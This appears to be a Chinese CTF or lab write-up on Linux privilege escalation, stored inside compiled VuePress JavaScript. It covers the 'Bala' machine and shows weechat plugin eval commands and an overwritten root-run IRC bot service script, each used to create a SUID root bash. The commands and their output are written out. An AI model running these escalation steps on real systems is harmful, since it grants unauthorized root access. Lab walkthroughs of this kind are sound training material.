line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("fzer@Bala:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" /usr/bin/weechat\nfzer@Bala:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lah")]),s._v("\ntotal "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".2M\ndrwxr-xr-x "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" fzer fzer "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("12")]),s._v(":22 "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),s._v("\ndrwxr-xr-x "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" root root "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("23")]),s._v(":59 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("\n-rwsr-xr-x "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" root root "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".2M Nov  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("12")]),s._v(":22 bash1\nlrwxrwxrwx "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" root root    "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("9")]),s._v(" Nov  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" 00:31 .bash_history -"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /dev/null\n-rw-r--r-- "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" fzer fzer  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("220")]),s._v(" Nov  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("23")]),s._v(":59 .bash_logout\n-rw-r--r-- "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" fzer fzer "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(".5K Nov  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("23")]),s._v(":59 .bashrc\n-rw-r--r-- "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" root root   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("48")]),s._v(" Nov  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" 00:33 doas.conf.bak\n-rw-r--r-- "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" fzer fzer  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("807")]),s._v(" Nov  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("23")]),s._v(":59 .profile\n-rw-r--r-- "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" root root   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("44")]),s._v(" Nov  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" 00:00 user.txt\nfzer@Bala:~$ ./bash1 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v("\nbash1-5.0"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# id")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("uid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("fzer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("gid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("fzer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("euid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("groups")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("fzer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nbash1-5.0"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# whoami")]),s._v("\nroot\nbash1-5.0"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# ")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-bala/4.png",alt:""}})]),s._v(" "),a("p",[s._v("使用help命令可以发现"),a("code",[s._v("python")]),s._v("、"),a("code",[s._v("perl")]),s._v("、"),a("code",[s._v("ruby")]),s._v("插件都可以使用"),a("code",[s._v("eval")]),s._v("参数执行代码。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-bala/5.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-bala/6.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-bala/7.png",alt:""}})]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("/python "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("eval")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("import")]),s._v(" os"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" os.system"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"cp /bin/bash /home/fzer/bash2;chmod u+s /home/fzer/bash2"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n/perl "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("eval")]),s._v(" system"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"cp /bin/bash /home/fzer/bash3;chmod u+s /home/fzer/bash3"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n/ruby "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("eval")]),s._v(" system"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"cp /bin/bash /home/fzer/bash4;chmod u+s /home/fzer/bash4"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("执行成功，有了对应 suid bash 文件")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-bala/8.png",alt:""}})]),s._v(" "),a("h3",{attrs:{id:"方法二-可写文件提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#方法二-可写文件提权"}},[s._v("#")]),s._v(" 方法二：可写文件提权")]),s._v(" "),a("p",[s._v("在 fzer 用户家目录下发现"),a("code",[s._v("doas.conf.bak")]),s._v("备份文件，查看内容，允许 fzer 用户以 root 身份无密码执行 "),a("code",[s._v("/usr/sbin/reboot")]),s._v("命令")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("fzer@Bala:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" doas.conf.bak \npermit nopass fzer as root cmd /usr/sbin/reboot\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("查看系统进程，找到 root 在运行一个bot脚本，父进程 PPID 是1，是 PID 1 init服务的子进程，大概率注册为了一个服务。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("fzer@Bala:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ps")]),s._v(" aux\n"),a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("UID")]),s._v("          PID    "),a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("PPID")]),s._v("  C STIME TTY          TIME CMD\nroot         "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("360")]),s._v("       "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("11")]),s._v(":35 ?        00:00:02 /usr/bin/python3 /usr/local/bin/irc_bot.py\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-bala/9.png",alt:""}})]),s._v(" "),a("p",[s._v("查看系统服务，系统注册了这个 irc_bot 服务，以一个名为 pycrtlake 的用户运行这个脚本")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("fzer@Bala:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" /etc/systemd/system /lib/systemd/system "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-name")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"*irc_bot*"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("/dev/null\n/etc/systemd/system/irc_bot.service\nfzer@Bala:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /etc/systemd/system/irc_bot.service\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Unit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("Description")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("IRC Bot Service\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("After")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("network.target\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Service"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("User")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pycrtlake\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("Group")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pycrtlake\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("WorkingDirectory")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/usr/local/bin\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("ExecStart")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/usr/bin/python3 /usr/local/bin/irc_bot.py\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("Restart")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("always\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("RestartSec")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("StandardOutput")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("syslog\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("StandardError")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("syslog\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("Environment")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("PYTHONUNBUFFERED"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Install"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("WantedBy")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("multi-user.target\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-bala/10.png",alt:""}})]),s._v(" "),a("p",[s._v("但是前面可以知道，这个 bot 脚本是 root 在运行，并且"),a("code",[s._v("/etc/passwd")]),s._v("文件中并没有 pycrtlake 用户")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-bala/11.png",alt:""}})]),s._v(" "),a("p",[s._v("查看脚本权限")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("fzer@Bala:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-alh")]),s._v(" /usr/local/bin/irc_bot.py\n-rwxr-x--- "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" fzer fzer "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".9K Nov  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" 00:08 /usr/local/bin/irc_bot.py\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("/usr/local/bin/irc_bot.py 脚本是 fzer 用户所有且有写权限，修改脚本内容，复制一份root bash 到家目录，添加suid 权限，同时验证是什么用户在运行脚本")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" os\nos"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("system"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"touch /home/fzer/`whoami`"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nos"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("system"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"cp /bin/bash /home/fzer/bash111;chmod u+s /home/fzer/bash111"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nexit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-bala/12.png",alt:""}})]),s._v(" "),a("p",[s._v("最后，使用家目录的 doas 命令备份提示，以 root 身份无密码执行 "),a("code",[s._v("/usr/sbin/reboot")]),s._v("命令，重启系统，直接重启虚拟机也是一样的效果，重启时 "),a("code",[s._v("init")]),s._v("进程会重新以root的身份创建 irc_bot 服务的子进程，运行修改后的脚本。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-bala/13.png",alt:""}})]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("fzer@Bala:~$ doas /usr/sbin/reboot\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-bala/14.png",alt:""}})]),s._v(" "),a("p",[s._v("重新 SSH 登录后，发现家目录下多了一个 "),a("code",[s._v("root")]),s._v(" 文件（验证了脚本以 root 身份运行），以及具有 "),a("code",[s._v("SUID")]),s._v(" 权限的 bash111 文件：")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-bala/15.png",alt:""}})])])}),[],!1,null,null,null);a.default=e.exports}}]);